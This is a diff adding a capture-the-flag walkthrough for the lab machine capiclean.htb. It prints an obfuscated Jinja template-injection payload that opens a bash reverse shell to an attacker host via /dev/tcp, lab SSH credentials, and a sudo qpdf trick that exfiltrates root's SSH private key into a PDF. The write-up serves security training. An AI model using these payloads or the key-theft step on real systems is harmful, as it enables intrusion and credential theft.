@@ -83,6 +83,52 @@ http://capiclean.htb/dashboard
 
 ![image](https://github.com/zer00d4y/writeups/assets/128820441/46ffbe82-e5ff-451d-9a9c-4687eec2c3b6)
 
+SSTI payload:
+
     {{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("bash -c '/bin/bash -i >& /dev/tcp/ATTACK_IP/PORT 0>&1'")|attr("read")()}}
 
 
+
+
+
+## SSH
+
+`ssh consuela@capiclean.htb`
+
+password: `simple and clean`
+
+Get the user flag
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/5398c1f1-0d59-431c-b5d1-680643d487ed)
+
+## Privilege escalation
+
+    sudo -l
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/1ba4487b-e860-4c17-9a04-d71371cd3da6)
+
+ `/usr/bin/qpdf`
+
+qpdf: https://qpdf.readthedocs.io/en/stable/cli.html
+
+    sudo qpdf --empty --add-attachment /root/.ssh/id_rsa -- /tmp/key.pdf
+
+Then open /tmp/key.pdf file and copy openssh private key
+
+Create keyfile 
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/437bb16a-9a83-4b05-bdaa-421bc13e33de)
+
+Set the resolution to 600 for the private keyfile
+
+    chmod 600 keyfile 
+
+Connect to ssh using keyfile 
+
+    ssh -i keyfile root@capiclean.htb
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/d95376ca-a4e4-4ec3-993e-8dccfbf5f5d8)
+
+Get the root flag 
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/e0c95df4-73a5-43bc-8b7b-eee1659da8e8)
